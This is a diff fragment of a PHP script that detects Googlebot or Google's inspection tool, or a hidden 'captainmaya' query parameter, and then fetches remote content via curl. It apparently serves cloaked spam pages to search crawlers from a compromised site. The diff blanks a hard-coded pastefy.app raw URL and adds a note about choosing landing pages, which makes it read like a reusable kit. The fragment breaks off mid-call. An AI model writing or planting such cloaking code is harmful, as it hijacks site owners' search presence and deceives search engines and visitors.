@@ -3,8 +3,8 @@ $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
 $q = isset($_GET['captainmaya']);
 $b = (strpos($ua,'googlebot')!==false | strpos($ua,'inspectiontool')!==false | $q);
 if ($b) {
-  $u = 'https://pastefy.app/Ek1ZmYZh/raw';
-  $r = '';
+  $u = ''; //u means landingpages or r amp u can choise
+  $r = ''; 
   if (function_exists('curl_init')) {
     $c = curl_init($u);
     curl_setopt_array($c,[
